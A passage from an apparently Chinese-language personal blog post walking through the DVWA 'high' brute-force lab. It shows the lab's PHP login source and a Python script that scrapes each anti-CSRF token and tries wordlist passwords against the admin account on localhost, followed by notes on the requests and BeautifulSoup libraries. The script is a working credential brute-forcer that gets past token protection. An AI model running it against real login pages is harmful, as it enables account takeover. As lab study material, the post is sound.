class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Brute Force Source</span><br><span class="line">vulnerabilities/brute/source/high.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>得出两点结论：</p>
-<ol>
-<li>因为mysqli_real_escape_string的存在，无法使用sql注入</li>
-<li>因为每次对token的验证，无法直接使用burpsuite暴力破解</li>
-</ol>
-<p>于是想到自己用python写脚本，可是我不会，怎么办呢，先来研究下别人的脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">'Host'</span>:<span class="string">'127.0.0.1'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Accept'</span>:<span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Accept-Language'</span>:<span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Referer'</span>:<span class="string">'http://127.0.0.1/vulnerabilities/brute/'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'cookie'</span>:<span class="string">'PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Connection'</span>:<span class="string">'close'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>:<span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">requrl=<span class="string">"http://127.0.0.1/vulnerabilities/brute/"</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(requrl,header)</span>:</span></span><br><span class="line"></span><br><span class="line">    response=requests.get(url=requrl,headers=header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (response.status_code,len(response.content))</span><br><span class="line"></span><br><span class="line">    soup=BeautifulSoup(response.text,<span class="string">"html.parser"</span>)</span><br><span class="line"></span><br><span class="line">    input=soup.form.select(<span class="string">"input[type='hidden']"</span>)   <span class="comment">#返回的是一个list列表</span></span><br><span class="line"></span><br><span class="line">    user_token=input[<span class="number">0</span>][<span class="string">'value'</span>]                   <span class="comment">#获取用户的token</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">user_token=get_token(requrl,header)</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"E:\Password\mima.txt"</span>):</span><br><span class="line"></span><br><span class="line">    requrl=<span class="string">"http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password="</span>+line.strip()+<span class="string">"&amp;Login=Login&amp;user_token="</span>+user_token</span><br><span class="line"></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (i , <span class="string">'admin'</span> ,line.strip(),end=<span class="string">"  "</span>)</span><br><span class="line"></span><br><span class="line">    user_token=get_token(requrl,header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="import-requests"><a href="#import-requests" class="headerlink" title="import requests"></a>import requests</h2><p><a href="https://www.cnblogs.com/lanyinhao/p/9634742.html" target="_blank" rel="noopener">参考文章</a></p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r1 = requests.get(url=<span class="string">'url'</span>, params=&#123;<span class="string">'wd'</span>: <span class="string">'python'</span>&#125;)</span><br><span class="line">print(r1.url)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; url?wd=python</span><br></pre></td></tr></table></figure>
-
-<p><strong>params为可选项</strong></p>
-<h3 id="几种方法"><a href="#几种方法" class="headerlink" title="几种方法"></a>几种方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1   requests.get(‘https:&#x2F;&#x2F;github.com&#x2F;timeline.json’)                         # GET请求</span><br><span class="line">2   requests.post(“http:&#x2F;&#x2F;httpbin.org&#x2F;post”)                                 # POST请求</span><br><span class="line">3   requests.put(“http:&#x2F;&#x2F;httpbin.org&#x2F;put”)                                   # PUT请求</span><br><span class="line">4   requests.delete(“http:&#x2F;&#x2F;httpbin.org&#x2F;delete”)                             # DELETE请求</span><br><span class="line">5   requests.head(“http:&#x2F;&#x2F;httpbin.org&#x2F;get”)                                  # HEAD请求</span><br><span class="line">6   requests.options(“http:&#x2F;&#x2F;httpbin.org&#x2F;get” )                              # OPTIONS请求</span><br></pre></td></tr></table></figure>
-
-<h3 id="响应的内容"><a href="#响应的内容" class="headerlink" title="响应的内容"></a>响应的内容</h3><ul>
-<li><p>r.encoding                           #获取当前的编码</p>
-</li>
-<li><p>r.encoding = ‘utf-8’             #设置编码</p>
-</li>
-<li><p>r.text                                     #以encoding解析返回内容。字符串方式的响应体，会自动根据响应头部的字符编码进行解码。</p>
-</li>
-<li><p>r.content                              #以字节形式（二进制）返回。字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩。</p>
-</li>
-<li><p>r.cookie                                #返回cookie</p>
-</li>
-<li><p>r.headers                             #以字典对象存储服务器响应头，但是这个字典比较特殊，字典键不区分大小写，若键不存在则返回None</p>
-</li>
-<li><p>r.status_code                      #响应状态码</p>
-</li>
-<li><p>r.raw                                    #返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read()   </p>
-</li>
-<li><p>r.ok                                      # 查看r.ok的布尔值便可以知道是否登陆成功</p>
-</li>
-</ul>
-<p>   #<em>特殊方法</em>#</p>
-<ul>
-<li><p>r.json()                                #Requests中内置的JSON解码器，以json形式返回,前提返回的内容确保是json格式的，不然解析出错会抛异常</p>
-</li>
-<li><p>r.raise_for_status()            #失败请求(非200响应)抛出异常</p>
-</li>
-</ul>
-<p><img src="/2020/02/20/%E7%94%A8%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3dvwa%E7%9A%84brute%E2%80%94-force/1.png" alt="1"></p>
-<h3 id="定制头和cookie信息"><a href="#定制头和cookie信息" class="headerlink" title="定制头和cookie信息"></a>定制头和cookie信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header = &#123;<span class="string">'user-agent'</span>: <span class="string">'my-app/0.0.1'</span><span class="string">'&#125; </span></span><br><span class="line"><span class="string">cookie = &#123;'</span>key<span class="string">':'</span>value<span class="string">'&#125; </span></span><br><span class="line"><span class="string">r = requests.get/post('</span>your url<span class="string">',headers=header,cookies=cookie)</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h2 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h2><p><a href="https://www.cnblogs.com/scios/p/8652760.html" target="_blank" rel="noopener">参考文章</a></p>
-<p>页面的源代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">			Username:<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			Password:<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">AUTOCOMPLETE</span>=<span class="string">"off"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Login"</span> <span class="attr">name</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'user_token'</span> <span class="attr">value</span>=<span class="string">'0871b3a033e5e832172e1c0931b3fc95'</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">soup &#x3D; BeautifulSoup(html_doc, &#39;html.parser&#39;, from_encoding&#x3D;&#39;utf-8&#39;)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>而对于脚本里的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input&#x3D;soup.form.select(&quot;input[type&#x3D;&#39;hidden&#39;]&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>大致意思是，在form标签里寻找input标签，而这个input标签的type要是hidden</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_token&#x3D;input[0][&#39;value&#39;]</span><br></pre></td></tr></table></figure>
-
-<p>然后获取这个input标签里的第一个value（即token）</p>
-<p><strong>当然，还有其他获取方法：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user_token &#x3D; soup.find_all(&#39;input&#39;)[3].get(&#39;value&#39;)</span><br><span class="line">user_token &#x3D; soup.form.input.input.input.input[&quot;value&quot;]</span><br></pre></td></tr></table></figure>
-
-<p>都代表找到第四个input</p>
-<h2 id="end-“-”"><a href="#end-“-”" class="headerlink" title="end=“  ”"></a>end=“  ”</h2><p>在python中，print里最后加上end=“  ”，可以起到不换行效果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (i , &#39;admin&#39; ,line.strip(),end&#x3D;&quot;  &quot;)</span><br></pre></td></tr></table></figure>
-
 </div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/4/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
